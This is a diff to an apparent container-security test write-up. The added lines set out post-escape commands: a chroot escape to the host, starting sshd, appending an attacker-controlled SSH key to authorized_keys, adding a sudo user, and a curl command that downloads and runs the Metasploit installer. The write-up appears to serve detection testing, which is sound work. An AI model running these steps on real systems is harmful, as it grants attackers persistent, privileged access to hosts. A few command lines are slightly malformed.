@@ -257,18 +257,32 @@ We also copied eicar file on the host itself, in /var/tmp, using the mounted hos
 
 From there we tested the following:
 
+- Enabled the SSH server on the host to allow for instance for remote access (persistency) and added a newly generated attacker controlled SSH key to authorized keys on the host. I simply used ssh-keygen to generate a new sample key pair for SSH on my machine:
+
+`/usr/bin/sshd start~`
+`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmljeUnkk3eBlavzDmw3Dm5gQJrjCs//3CxJ+4mjbRbja4Hu1o46smTsHJkgXVfwyelUbTTCjRny5LcP9A
+4AzQfdLTkhnHrfFNpSja7ouOzL4cyPrgtA0qvJWYPwRvXYAiO9tJ1G6XEYz3Y+i2WbVP+c/OIUUqojldlJaEeFgVu8+TArHUtAx6HOXkpeFE/+6dBEpb/ezG
+sGO4Afp9FZxCChVoLLWEa6Bdbdjsq0PxKbp3/+kf9OyJCB2kHRiEyJBDGmXrsgo/cJ5mdgfM0EN2OwKJm9MKH+73LpX2HXH+76Vr5OjiedlKxTfQq37rBpyG
+pyE6tQqV1DRLPz7cCi3ALc74FVghQRBVCL/Jv0MXBoBbC3H+Ik148ZyKzGzrBMJkICnaftpQw8fwHkGhzH+zkRK5fwZBS3kEL1lM8hvJ7Q0VxasqOLgpdYAa
+sWE4Y1lCLqTdRjtYsuRshcdJj8soa9tKWwwDbiEPANLvuilsyRrwp0YpWwv2XhpjnpWl+gU= " >> ~/.ssh/authorized_keys`
+
 - Escape to the node using chroot (basically changing our root directory to the host's and launching bash from there):
 
 `chroot /host-system bash` 
 
-- Installed OpenSSH server on the host 
+- Added a new user to the sudoers group:
+
+`useradd -g sudo Tux`
+
+- Downloading, installing and running MetaSploit (a known attacker framework with collection of exploits):
+
+`curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall`
+  
+ `/opt`
 
 
-- Added a newly generated attacker controlled SSH key to authorized keys on the host
-
-- Started SSH server
-
-- Added a new user to the sudoers group
 
 
 
